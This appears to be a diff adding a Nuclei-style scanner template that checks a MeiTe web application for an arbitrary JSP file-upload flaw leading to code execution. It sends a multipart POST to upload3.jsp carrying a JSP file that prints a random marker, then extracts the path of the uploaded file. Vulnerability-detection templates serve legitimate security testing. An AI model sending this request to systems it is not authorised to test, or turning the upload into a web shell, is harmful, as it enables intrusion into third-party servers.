@@ -1,0 +1,73 @@
+id: MeiTe-upload3-upload-file
+
+info:
+  name: "MeiTe-upload3-upload-file"
+  author: iSee857
+  severity: critical
+  description: MeiTe-upload3-upload-file
+  reference:
+    - https://example.com/vuln-details
+  tags: file-upload,jsp,rce
+
+http:
+  - raw:
+      - |
+        POST /common/jsp/upload3.jsp?key=file&form=formdata&field=attach_name_1&filetitle=attach_title_1&folder=null&relativepath=null%3E HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{randstr}}
+        Accept-Encoding: gzip, deflate
+
+        ------WebKitFormBoundary{{randstr}}
+        Content-Disposition: form-data; name="file"; filename="test_{{randstr}}.jsp"
+        Content-Type: application/octet-stream
+
+        <% out.println("SECRAGON_TEST_{{randstr}}"); %>
+        ------WebKitFormBoundary{{randstr}}
+        Content-Disposition: form-data; name="key"
+        
+        file
+        ------WebKitFormBoundary{{randstr}}
+        Content-Disposition: form-data; name="form"
+        
+        formdata
+        ------WebKitFormBoundary{{randstr}}
+        Content-Disposition: form-data; name="field"
+        
+        attach_name_1
+        ------WebKitFormBoundary{{randstr}}
+        Content-Disposition: form-data; name="filetitile"
+        
+        attach_title_1
+        ------WebKitFormBoundary{{randstr}}
+        Content-Disposition: form-data; name="filefolder"
+        
+        null
+        ------WebKitFormBoundary{{randstr}}
+        Content-Disposition: form-data; name="relativepath"
+        
+        null
+        ------WebKitFormBoundary{{randstr}}--
+
+    attack: batteringram
+    redirects: true
+    max-redirects: 3
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - ".jsp"
+          - "src"
+          - "SECRAGON_TEST_{{randstr}}"
+        condition: and
+        part: body
+
+    extractors:
+      - type: regex
+        name: upload_path
+        part: body
+        regex:
+          - '"(/[^\"]+test_{{randstr}}\.jsp)"'
